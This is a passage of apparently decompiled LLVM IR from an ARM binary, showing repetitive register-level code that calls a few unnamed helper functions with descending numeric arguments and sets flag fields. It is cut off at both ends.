  store i32 %v0_9ba0, i32* %r1.global-to-local, align 4
  store i32 46, i32* %r0.global-to-local, align 4
  %v2_9ba8 = inttoptr i32 %v0_9ba0 to i32*
  %v3_9ba8 = call i32 @function_12f90(i32 46, i32* %v2_9ba8)
  %v0_9bac = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9bac, i32* @r1, align 4
  store i32 %v3_9ba8, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9bb8 = call i32 @function_13cf0(i8* %tmp200, i32 %v0_9bac, i32 %v3_9ba8)
  store i32 %v4_9bb8, i32* %r0.global-to-local, align 4
  %v1_9bbc = add i32 %v4_9bb8, 1
  %v2_9bbc = icmp eq i32 %v4_9bb8, -1
  store i1 %v2_9bbc, i1* %cpsr_c.global-to-local, align 1
  %v3_9bbc = sub i32 0, %v4_9bb8
  %v4_9bbc = and i32 %v1_9bbc, %v3_9bbc
  %v5_9bbc = icmp slt i32 %v4_9bbc, 0
  store i1 %v5_9bbc, i1* %cpsr_v.global-to-local, align 1
  %v6_9bbc = icmp slt i32 %v1_9bbc, 0
  store i1 %v6_9bbc, i1* %cpsr_n.global-to-local, align 1
  %v7_9bbc = icmp eq i32 %v1_9bbc, 0
  store i1 %v7_9bbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9bbc, label %.thread46, label %bb216

bb216:                                            ; preds = %dec_label_pc_9b78
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_9bc4 = load i32, i32* @r8, align 4
  %v3_9bc4 = add i32 %v2_9bc4, -4
  %v4_9bc4 = inttoptr i32 %v3_9bc4 to i32*
  store i32 2, i32* %v4_9bc4, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_9b78, %bb216
  %v0_9bc8 = load i32, i32* @r5, align 4
  store i32 %v0_9bc8, i32* %r1.global-to-local, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v2_9bd0 = inttoptr i32 %v0_9bc8 to i32*
  %v3_9bd0 = call i32 @function_12f90(i32 45, i32* %v2_9bd0)
  %v0_9bd4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9bd4, i32* @r1, align 4
  store i32 %v3_9bd0, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9be0 = call i32 @function_13cf0(i8* %tmp200, i32 %v0_9bd4, i32 %v3_9bd0)
  store i32 %v4_9be0, i32* %r0.global-to-local, align 4
  %v1_9be4 = add i32 %v4_9be0, 1
  %v2_9be4 = icmp eq i32 %v4_9be0, -1
  store i1 %v2_9be4, i1* %cpsr_c.global-to-local, align 1
  %v3_9be4 = sub i32 0, %v4_9be0
  %v4_9be4 = and i32 %v1_9be4, %v3_9be4
  %v5_9be4 = icmp slt i32 %v4_9be4, 0
  store i1 %v5_9be4, i1* %cpsr_v.global-to-local, align 1
  %v6_9be4 = icmp slt i32 %v1_9be4, 0
  store i1 %v6_9be4, i1* %cpsr_n.global-to-local, align 1
  %v7_9be4 = icmp eq i32 %v1_9be4, 0
  store i1 %v7_9be4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9be4, label %.thread47, label %bb217

bb217:                                            ; preds = %.thread46
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9bec = load i32, i32* @r8, align 4
  %v3_9bec = add i32 %v2_9bec, -4
  %v4_9bec = inttoptr i32 %v3_9bec to i32*
  store i32 1, i32* %v4_9bec, align 4
  br label %.thread47

.thread47:                                        ; preds = %.thread46, %bb217
  %v0_9bf0 = load i32, i32* @r5, align 4
  store i32 %v0_9bf0, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_9bf8 = load i32, i32* @r8, align 4
  %v2_9bf8 = inttoptr i32 %v1_9bf8 to i32*
  store i32 %v0_9bf0, i32* %v2_9bf8, align 4
  %v2_9bfc = inttoptr i32 %v0_9bf0 to i32*
  %v3_9bfc = call i32 @function_12f90(i32 44, i32* %v2_9bfc)
  %v0_9c00 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9c00, i32* @r1, align 4
  store i32 %v3_9bfc, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9c0c = call i32 @function_13cf0(i8* %tmp200, i32 %v0_9c00, i32 %v3_9bfc)
  store i32 %v4_9c0c, i32* %r0.global-to-local, align 4
  %v1_9c10 = add i32 %v4_9c0c, 1
  %v2_9c10 = icmp eq i32 %v4_9c0c, -1
  store i1 %v2_9c10, i1* %cpsr_c.global-to-local, align 1
  %v3_9c10 = sub i32 0, %v4_9c0c
  %v4_9c10 = and i32 %v1_9c10, %v3_9c10
  %v5_9c10 = icmp slt i32 %v4_9c10, 0
  store i1 %v5_9c10, i1* %cpsr_v.global-to-local, align 1
  %v6_9c10 = icmp slt i32 %v1_9c10, 0
  store i1 %v6_9c10, i1* %cpsr_n.global-to-local, align 1
  %v7_9c10 = icmp eq i32 %v1_9c10, 0
  store i1 %v7_9c10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9c10, label %.thread48, label %dec_label_pc_9c18

dec_label_pc_9c18:                                ; preds = %.thread47
  %v0_9c18 = load i32, i32* @r5, align 4
  store i32 %v0_9c18, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v2_9c20 = inttoptr i32 %v0_9c18 to i32*
  %v3_9c20 = call i32 @function_12f90(i32 44, i32* %v2_9c20)
  %v0_9c24 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9c24, i32* @r1, align 4
  store i32 %v3_9c20, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9c30 = call i32 @function_13cf0(i8* %tmp200, i32 %v0_9c24, i32 %v3_9c20)
  store i32 %v4_9c30, i32* %r0.global-to-local, align 4
  store i32 %v2_94a0, i32* %lr.global-to-local, align 4
  %v2_9c3c = add i32 %v4_9c30, %v2_94a0
  store i32 %v2_9c3c, i32* %r3.global-to-local, align 4
  %v1_9c40 = load i32, i32* @r6, align 4
  %v2_9c40 = add i32 %v1_9c40, %v2_9c3c
  %v3_9c40 = inttoptr i32 %v2_9c40 to i8*
  %v4_9c40 = load i8, i8* %v3_9c40, align 1
  %v2_9c48 = icmp ugt i8 %v4_9c40, 31
  store i1 %v2_9c48, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9c48 = icmp ult i8 %v4_9c40, 32
  store i1 %v6_9c48, i1* %cpsr_n.global-to-local, align 1
  %v7_9c48 = icmp eq i8 %v4_9c40, 32
  store i1 %v7_9c48, i1* %cpsr_z.global-to-local, align 1
  %v2_9c50 = zext i1 %v7_9c48 to i32
  %v2_9c50.v4_9c30 = add i32 %v2_9c50, %v4_9c30
  store i32 %v2_9c50.v4_9c30, i32* @r4, align 4
  %v2_9c54 = add i32 %v2_9c50.v4_9c30, %v2_8fd8
  store i32 %v2_9c54, i32* @r6, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9c54, i32* %r0.global-to-local, align 4
  %v1_9c60 = load i32, i32* %fp.global-to-local, align 4
  %v2_9c60 = sub i32 %v1_9c60, %v2_9c50.v4_9c30
  store i32 %v2_9c60, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v4_9c68 = call i32 @function_13a60(i32 %v2_9c54, i32 %v2_9c60, i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32 2)
  store i32 %v4_9c68, i32* %r0.global-to-local, align 4
  %v1_9c6c = add i32 %v4_9c68, 1
  %v2_9c6c = icmp eq i32 %v4_9c68, -1
  store i1 %v2_9c6c, i1* %cpsr_c.global-to-local, align 1
  %v3_9c6c = sub i32 0, %v4_9c68
  %v4_9c6c = and i32 %v1_9c6c, %v3_9c6c
  %v5_9c6c = icmp slt i32 %v4_9c6c, 0
  store i1 %v5_9c6c, i1* %cpsr_v.global-to-local, align 1
  %v6_9c6c = icmp slt i32 %v1_9c6c, 0
  store i1 %v6_9c6c, i1* %cpsr_n.global-to-local, align 1
  %v7_9c6c = icmp eq i32 %v1_9c6c, 0
  store i1 %v7_9c6c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_9c68, i32* %r2.global-to-local, align 4
  br i1 %v7_9c6c, label %.thread48, label %dec_label_pc_9c78

dec_label_pc_9c78:                                ; preds = %dec_label_pc_9c18
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v1_9c80 = load i32, i32* @r4, align 4
  %v2_9c80 = add i32 %v1_9c80, %v2_94a0
  %v1_9c84 = add i32 %v4_9c68, -1
  %v2_9c84 = icmp ne i32 %v4_9c68, 0
  store i1 %v2_9c84, i1* %cpsr_c.global-to-local, align 1
  %v3_9c84 = sub i32 0, %v4_9c68
  %v4_9c84 = and i32 %v4_9c68, %v3_9c84
  %v5_9c84 = icmp slt i32 %v4_9c84, 0
  store i1 %v5_9c84, i1* %cpsr_v.global-to-local, align 1
  %v6_9c84 = icmp slt i32 %v1_9c84, 0
  store i1 %v6_9c84, i1* %cpsr_n.global-to-local, align 1
  %v7_9c84 = icmp eq i32 %v4_9c68, 1
  store i1 %v7_9c84, i1* %cpsr_z.global-to-local, align 1
  %v1_9c88 = add i32 %v2_9c80, -20736
  store i32 %v1_9c88, i32* %r3.global-to-local, align 4
  %v7_9c8c = icmp sgt i32 %v4_9c68, 1
  br i1 %v7_9c8c, label %bb218, label %bb219

bb218:                                            ; preds = %dec_label_pc_9c78
  %v9_9c8c = add i32 %v4_9c68, -2
  store i32 %v9_9c8c, i32* %r2.global-to-local, align 4
  br label %bb219

bb219:                                            ; preds = %dec_label_pc_9c78, %bb218
  %v3_9c94 = phi i32 [ %v4_9c68, %dec_label_pc_9c78 ], [ %v9_9c8c, %bb218 ]
  %v1_9c90 = add i32 %v2_9c80, -20773
  store i32 %v1_9c90, i32* %r3.global-to-local, align 4
  %v0_9c94 = load i32, i32* @r5, align 4
  %v1_9c94 = trunc i32 %v0_9c94 to i8
  %v4_9c94 = add i32 %v3_9c94, %v1_9c90
  %v5_9c94 = inttoptr i32 %v4_9c94 to i8*
  store i8 %v1_9c94, i8* %v5_9c94, align 1
  %v0_9c98 = load i32, i32* @r6, align 4
  store i32 %v0_9c98, i32* %r0.global-to-local, align 4
  %v1_9c9c = inttoptr i32 %v0_9c98 to i8*
  %v2_9c9c = call i32 @function_1399c(i8* %v1_9c9c)
  %v0_9ca0 = load i32, i32* @r5, align 4
  store i32 %v0_9ca0, i32* %r1.global-to-local, align 4
  store i32 %v2_9c9c, i32* @r4, align 4
  store i32 43, i32* %r0.global-to-local, align 4
  %v2_9cac = inttoptr i32 %v0_9ca0 to i32*
  %v3_9cac = call i32 @function_12f90(i32 43, i32* %v2_9cac)
  %v0_9cb0 = load i32, i32* @r4, align 4
  store i32 %v0_9cb0, i32* @r1, align 4
  store i32 %v3_9cac, i32* %r2.global-to-local, align 4
  %v0_9cb8 = load i32, i32* @r6, align 4
  store i32 %v0_9cb8, i32* %r0.global-to-local, align 4
  %v3_9cbc = inttoptr i32 %v0_9cb8 to i8*
  %v4_9cbc = call i32 @function_13cf0(i8* %v3_9cbc, i32 %v0_9cb0, i32 %v3_9cac)
  store i32 %v4_9cbc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9cc0 = icmp slt i32 %v4_9cbc, 0
  store i1 %v1_9cc0, i1* %cpsr_n.global-to-local, align 1
  %v2_9cc0 = icmp eq i32 %v4_9cbc, 0
  store i1 %v2_9cc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9cc0, label %.thread48, label %bb220

bb220:                                            ; preds = %bb219
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9cc8 = load i32, i32* @r8, align 4
  %v3_9cc8 = inttoptr i32 %v2_9cc8 to i32*
  store i32 1, i32* %v3_9cc8, align 4
  br label %.thread48

.thread48:                                        ; preds = %bb219, %dec_label_pc_9c18, %.thread47, %bb220
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_9cd8 = load i32, i32* @r8, align 4
  %v2_9cd8 = add i32 %v1_9cd8, 4
  %v3_9cd8 = inttoptr i32 %v2_9cd8 to i32*
  store i32 0, i32* %v3_9cd8, align 4
  %v3_9cdc = call i32 @function_12f90(i32 41, i32* null)
  %v0_9ce0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9ce0, i32* @r1, align 4
  store i32 %v3_9cdc, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9cec = call i32 @function_13cf0(i8* %tmp200, i32 %v0_9ce0, i32 %v3_9cdc)
  store i32 %v4_9cec, i32* %r0.global-to-local, align 4
  %v1_9cf4 = add i32 %v4_9cec, 1
  %v2_9cf4 = icmp eq i32 %v4_9cec, -1
  store i1 %v2_9cf4, i1* %cpsr_c.global-to-local, align 1
  %v3_9cf4 = sub i32 0, %v4_9cec
  %v4_9cf4 = and i32 %v1_9cf4, %v3_9cf4
  %v5_9cf4 = icmp slt i32 %v4_9cf4, 0
  store i1 %v5_9cf4, i1* %cpsr_v.global-to-local, align 1
  %v6_9cf4 = icmp slt i32 %v1_9cf4, 0
  store i1 %v6_9cf4, i1* %cpsr_n.global-to-local, align 1
  %v7_9cf4 = icmp eq i32 %v1_9cf4, 0
  store i1 %v7_9cf4, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r5, align 4
  br i1 %v7_9cf4, label %.thread49, label %dec_label_pc_9d00

dec_label_pc_9d00:                                ; preds = %.thread48
  %v0_9d00 = load i32, i32* @r6, align 4
  store i32 %v0_9d00, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v2_9d08 = inttoptr i32 %v0_9d00 to i32*
  %v3_9d08 = call i32 @function_12f90(i32 41, i32* %v2_9d08)
  %v0_9d0c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9d0c, i32* @r1, align 4
  store i32 %v3_9d08, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9d18 = call i32 @function_13cf0(i8* %tmp200, i32 %v0_9d0c, i32 %v3_9d08)
  store i32 %v4_9d18, i32* %r0.global-to-local, align 4
  store i32 %v2_94a0, i32* %lr.global-to-local, align 4
  %v2_9d24 = add i32 %v4_9d18, %v2_94a0
  store i32 %v2_9d24, i32* %r3.global-to-local, align 4
  %v1_9d28 = load i32, i32* @r5, align 4
  %v2_9d28 = add i32 %v1_9d28, %v2_9d24
  %v3_9d28 = inttoptr i32 %v2_9d28 to i8*
  %v4_9d28 = load i8, i8* %v3_9d28, align 1
  %v2_9d30 = icmp ugt i8 %v4_9d28, 31
  store i1 %v2_9d30, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9d30 = icmp ult i8 %v4_9d28, 32
  store i1 %v6_9d30, i1* %cpsr_n.global-to-local, align 1
  %v7_9d30 = icmp eq i8 %v4_9d28, 32
  store i1 %v7_9d30, i1* %cpsr_z.global-to-local, align 1
  %v2_9d38 = zext i1 %v7_9d30 to i32
  %v2_9d38.v4_9d18 = add i32 %v2_9d38, %v4_9d18
  store i32 %v2_9d38.v4_9d18, i32* @r4, align 4
  %v2_9d3c = add i32 %v2_9d38.v4_9d18, %v2_8fd8
  store i32 %v2_9d3c, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9d3c, i32* %r0.global-to-local, align 4
  %v1_9d48 = load i32, i32* %fp.global-to-local, align 4
  %v2_9d48 = sub i32 %v1_9d48, %v2_9d38.v4_9d18
  store i32 %v2_9d48, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v4_9d50 = call i32 @function_13a60(i32 %v2_9d3c, i32 %v2_9d48, i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32 2)
  store i32 %v4_9d50, i32* %r0.global-to-local, align 4
  %v1_9d54 = add i32 %v4_9d50, 1
  %v2_9d54 = icmp eq i32 %v4_9d50, -1
  store i1 %v2_9d54, i1* %cpsr_c.global-to-local, align 1
  %v3_9d54 = sub i32 0, %v4_9d50
  %v4_9d54 = and i32 %v1_9d54, %v3_9d54
  %v5_9d54 = icmp slt i32 %v4_9d54, 0
  store i1 %v5_9d54, i1* %cpsr_v.global-to-local, align 1
  %v6_9d54 = icmp slt i32 %v1_9d54, 0
  store i1 %v6_9d54, i1* %cpsr_n.global-to-local, align 1
  %v7_9d54 = icmp eq i32 %v1_9d54, 0
  store i1 %v7_9d54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_9d50, i32* %r2.global-to-local, align 4
  br i1 %v7_9d54, label %.thread49, label %dec_label_pc_9d60

dec_label_pc_9d60:                                ; preds = %dec_label_pc_9d00
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v1_9d68 = load i32, i32* @r4, align 4
  %v2_9d68 = add i32 %v1_9d68, %v2_94a0
  %v1_9d6c = add i32 %v4_9d50, -1
  %v2_9d6c = icmp ne i32 %v4_9d50, 0
  store i1 %v2_9d6c, i1* %cpsr_c.global-to-local, align 1
  %v3_9d6c = sub i32 0, %v4_9d50
  %v4_9d6c = and i32 %v4_9d50, %v3_9d6c
  %v5_9d6c = icmp slt i32 %v4_9d6c, 0
  store i1 %v5_9d6c, i1* %cpsr_v.global-to-local, align 1
  %v6_9d6c = icmp slt i32 %v1_9d6c, 0
  store i1 %v6_9d6c, i1* %cpsr_n.global-to-local, align 1
  %v7_9d6c = icmp eq i32 %v4_9d50, 1
  store i1 %v7_9d6c, i1* %cpsr_z.global-to-local, align 1
  %v1_9d70 = add i32 %v2_9d68, -20736
  store i32 %v1_9d70, i32* %r3.global-to-local, align 4
  %v7_9d74 = icmp sgt i32 %v4_9d50, 1
  br i1 %v7_9d74, label %bb221, label %bb222

bb221:                                            ; preds = %dec_label_pc_9d60
  %v9_9d74 = add i32 %v4_9d50, -2
  store i32 %v9_9d74, i32* %r2.global-to-local, align 4
  br label %bb222

bb222:                                            ; preds = %dec_label_pc_9d60, %bb221
  %v3_9d7c = phi i32 [ %v4_9d50, %dec_label_pc_9d60 ], [ %v9_9d74, %bb221 ]
  %v1_9d78 = add i32 %v2_9d68, -20773
  store i32 %v1_9d78, i32* %r3.global-to-local, align 4
  %v0_9d7c = load i32, i32* @r6, align 4
  %v1_9d7c = trunc i32 %v0_9d7c to i8
  %v4_9d7c = add i32 %v3_9d7c, %v1_9d78
  %v5_9d7c = inttoptr i32 %v4_9d7c to i8*
  store i8 %v1_9d7c, i8* %v5_9d7c, align 1
  %v0_9d80 = load i32, i32* @r5, align 4
  store i32 %v0_9d80, i32* %r0.global-to-local, align 4
  %v1_9d84 = inttoptr i32 %v0_9d80 to i8*
  %v2_9d84 = call i32 @function_1399c(i8* %v1_9d84)
  %v0_9d88 = load i32, i32* @r6, align 4
  store i32 %v0_9d88, i32* %r1.global-to-local, align 4
  store i32 %v2_9d84, i32* @r4, align 4
  store i32 42, i32* %r0.global-to-local, align 4
  %v2_9d94 = inttoptr i32 %v0_9d88 to i32*
  %v3_9d94 = call i32 @function_12f90(i32 42, i32* %v2_9d94)
  %v0_9d98 = load i32, i32* @r4, align 4
  store i32 %v0_9d98, i32* @r1, align 4
  store i32 %v3_9d94, i32* %r2.global-to-local, align 4
  %v0_9da0 = load i32, i32* @r5, align 4
  store i32 %v0_9da0, i32* %r0.global-to-local, align 4
  %v3_9da4 = inttoptr i32 %v0_9da0 to i8*
  %v4_9da4 = call i32 @function_13cf0(i8* %v3_9da4, i32 %v0_9d98, i32 %v3_9d94)
  store i32 %v4_9da4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9da8 = icmp slt i32 %v4_9da4, 0
  store i1 %v1_9da8, i1* %cpsr_n.global-to-local, align 1
  %v2_9da8 = icmp eq i32 %v4_9da4, 0
  store i1 %v2_9da8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9da8, label %.thread49, label %bb223

bb223:                                            ; preds = %bb222
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9db0 = load i32, i32* @r8, align 4
  %v3_9db0 = add i32 %v2_9db0, 4
  %v4_9db0 = inttoptr i32 %v3_9db0 to i32*
  store i32 1, i32* %v4_9db0, align 4
  br label %.thread49

.thread49:                                        ; preds = %bb222, %dec_label_pc_9d00, %.thread48, %bb223
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_9dbc = call i32 @function_12f90(i32 40, i32* null)
  %v0_9dc0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9dc0, i32* @r1, align 4
  store i32 %v3_9dbc, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9dcc = call i32 @function_13cf0(i8* %tmp200, i32 %v0_9dc0, i32 %v3_9dbc)
  store i32 %v4_9dcc, i32* %r0.global-to-local, align 4
  %v1_9dd0 = add i32 %v4_9dcc, 1
  %v2_9dd0 = icmp eq i32 %v4_9dcc, -1
  store i1 %v2_9dd0, i1* %cpsr_c.global-to-local, align 1
  %v3_9dd0 = sub i32 0, %v4_9dcc
  %v4_9dd0 = and i32 %v1_9dd0, %v3_9dd0
  %v5_9dd0 = icmp slt i32 %v4_9dd0, 0
  store i1 %v5_9dd0, i1* %cpsr_v.global-to-local, align 1
  %v6_9dd0 = icmp slt i32 %v1_9dd0, 0
  store i1 %v6_9dd0, i1* %cpsr_n.global-to-local, align 1
  %v7_9dd0 = icmp eq i32 %v1_9dd0, 0
  store i1 %v7_9dd0, i1* %cpsr_z.global-to-local, align 1
  store i32 -20737, i32* %r5.global-to-local, align 4
  br i1 %v7_9dd0, label %.thread, label %dec_label_pc_9de8

.thread:                                          ; preds = %.thread49
  store i32 -20773, i32* %r5.global-to-local, align 4
  %v2_9de0 = load i32, i32* @r8, align 4
  %v3_9de0 = add i32 %v2_9de0, 8
  %v4_9de0 = inttoptr i32 %v3_9de0 to i32*
  store i32 0, i32* %v4_9de0, align 4
  br label %dec_label_pc_9e7c

dec_label_pc_9de8:                                ; preds = %.thread49
  store i32 -20773, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_9df0 = call i32 @function_12f90(i32 40, i32* null)
  %v0_9df4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9df4, i32* @r1, align 4
  store i32 %v3_9df0, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9e00 = call i32 @function_13cf0(i8* %tmp200, i32 %v0_9df4, i32 %v3_9df0)
  store i32 %v4_9e00, i32* %r0.global-to-local, align 4
  store i32 %v2_94a0, i32* %lr.global-to-local, align 4
  %v2_9e0c = add i32 %v4_9e00, %v2_94a0
  store i32 %v2_9e0c, i32* %r3.global-to-local, align 4
  %v1_9e10 = load i32, i32* @r5, align 4
  %v2_9e10 = add i32 %v1_9e10, %v2_9e0c
  %v3_9e10 = inttoptr i32 %v2_9e10 to i8*
  %v4_9e10 = load i8, i8* %v3_9e10, align 1
  %v2_9e18 = icmp ugt i8 %v4_9e10, 31
  store i1 %v2_9e18, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9e18 = icmp ult i8 %v4_9e10, 32
  store i1 %v6_9e18, i1* %cpsr_n.global-to-local, align 1
  %v7_9e18 = icmp eq i8 %v4_9e10, 32
  store i1 %v7_9e18, i1* %cpsr_z.global-to-local, align 1
  %v2_9e20 = zext i1 %v7_9e18 to i32
  %v2_9e20.v4_9e00 = add i32 %v2_9e20, %v4_9e00
  store i32 %v2_9e20.v4_9e00, i32* @r4, align 4
  %v2_9e24 = add i32 %v2_9e20.v4_9e00, %v2_8fd8
  store i32 %v2_9e24, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9e24, i32* %r0.global-to-local, align 4
  %v1_9e30 = load i32, i32* %fp.global-to-local, align 4
  %v2_9e30 = sub i32 %v1_9e30, %v2_9e20.v4_9e00
  store i32 %v2_9e30, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v4_9e38 = call i32 @function_13a60(i32 %v2_9e24, i32 %v2_9e30, i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32 2)
  store i32 %v4_9e38, i32* %r0.global-to-local, align 4
  %v1_9e3c = add i32 %v4_9e38, 1
  %v2_9e3c = icmp eq i32 %v4_9e38, -1
  store i1 %v2_9e3c, i1* %cpsr_c.global-to-local, align 1
  %v3_9e3c = sub i32 0, %v4_9e38
  %v4_9e3c = and i32 %v1_9e3c, %v3_9e3c
  %v5_9e3c = icmp slt i32 %v4_9e3c, 0
  store i1 %v5_9e3c, i1* %cpsr_v.global-to-local, align 1
  %v6_9e3c = icmp slt i32 %v1_9e3c, 0
  store i1 %v6_9e3c, i1* %cpsr_n.global-to-local, align 1
  %v7_9e3c = icmp eq i32 %v1_9e3c, 0
  store i1 %v7_9e3c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_9e38, i32* %r2.global-to-local, align 4
  br i1 %v7_9e3c, label %dec_label_pc_9e7c, label %dec_label_pc_9e48

dec_label_pc_9e48:                                ; preds = %dec_label_pc_9de8
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v1_9e50 = load i32, i32* @r4, align 4
  %v2_9e50 = add i32 %v1_9e50, %v2_94a0
  %v1_9e54 = add i32 %v4_9e38, -1
  %v2_9e54 = icmp ne i32 %v4_9e38, 0
  store i1 %v2_9e54, i1* %cpsr_c.global-to-local, align 1
  %v3_9e54 = sub i32 0, %v4_9e38
  %v4_9e54 = and i32 %v4_9e38, %v3_9e54
  %v5_9e54 = icmp slt i32 %v4_9e54, 0
  store i1 %v5_9e54, i1* %cpsr_v.global-to-local, align 1
  %v6_9e54 = icmp slt i32 %v1_9e54, 0
  store i1 %v6_9e54, i1* %cpsr_n.global-to-local, align 1
  %v7_9e54 = icmp eq i32 %v4_9e38, 1
  store i1 %v7_9e54, i1* %cpsr_z.global-to-local, align 1
  %v1_9e58 = add i32 %v2_9e50, -20736
  store i32 %v1_9e58, i32* %r3.global-to-local, align 4
  %v7_9e5c = icmp sgt i32 %v4_9e38, 1
  br i1 %v7_9e5c, label %bb224, label %bb225

bb224:                                            ; preds = %dec_label_pc_9e48
  %v9_9e5c = add i32 %v4_9e38, -2
  store i32 %v9_9e5c, i32* %r2.global-to-local, align 4
  br label %bb225

bb225:                                            ; preds = %dec_label_pc_9e48, %bb224
  %v3_9e70 = phi i32 [ %v4_9e38, %dec_label_pc_9e48 ], [ %v9_9e5c, %bb224 ]
  %v1_9e60 = add i32 %v2_9e50, -20773
  store i32 %v1_9e60, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_9e68 = load i32, i32* @r5, align 4
  store i32 %v0_9e68, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v4_9e70 = add i32 %v3_9e70, %v1_9e60
  %v5_9e70 = inttoptr i32 %v4_9e70 to i8*
  store i8 0, i8* %v5_9e70, align 1
  %v2_9e74 = inttoptr i32 %v0_9e68 to i8*
  %v3_9e74 = call i32 @function_13ac8(i8* %v2_9e74, i32 10)
  store i32 %v3_9e74, i32* %r0.global-to-local, align 4
  %v1_9e78 = load i32, i32* @r8, align 4
  %v2_9e78 = add i32 %v1_9e78, 8
  %v3_9e78 = inttoptr i32 %v2_9e78 to i32*
  store i32 %v3_9e74, i32* %v3_9e78, align 4
  br label %dec_label_pc_9e7c

dec_label_pc_9e7c:                                ; preds = %.thread, %dec_label_pc_9de8, %bb225
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_9e80

dec_label_pc_9e80:                                ; preds = %dec_label_pc_a054, %dec_label_pc_9fd4, %dec_label_pc_9e7c
  %v1_9e8c = phi i32 [ 0, %dec_label_pc_9e7c ], [ %v0_9fd4, %dec_label_pc_9fd4 ], [ %v1_9e8c.pre.pre, %dec_label_pc_a054 ]
  store i32 %v2_8fd8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v2_9e8c = add i32 %v1_9e8c, %v2_8fd8
  store i32 %v2_9e8c, i32* @r4, align 4
  %v3_9e90 = call i32 @function_12f90(i32 39, i32* null)
  %v0_9e94 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9e94, i32* @r1, align 4
  store i32 %v3_9e90, i32* %r2.global-to-local, align 4
  %v0_9e9c = load i32, i32* @r4, align 4
  store i32 %v0_9e9c, i32* %r0.global-to-local, align 4
  %v3_9ea0 = inttoptr i32 %v0_9e9c to i8*
  %v4_9ea0 = call i32 @function_13cf0(i8* %v3_9ea0, i32 %v0_9e94, i32 %v3_9e90)
  store i32 %v4_9ea0, i32* %r0.global-to-local, align 4
  %v1_9ea8 = add i32 %v4_9ea0, 1
  %v2_9ea8 = icmp eq i32 %v4_9ea0, -1
  store i1 %v2_9ea8, i1* %cpsr_c.global-to-local, align 1
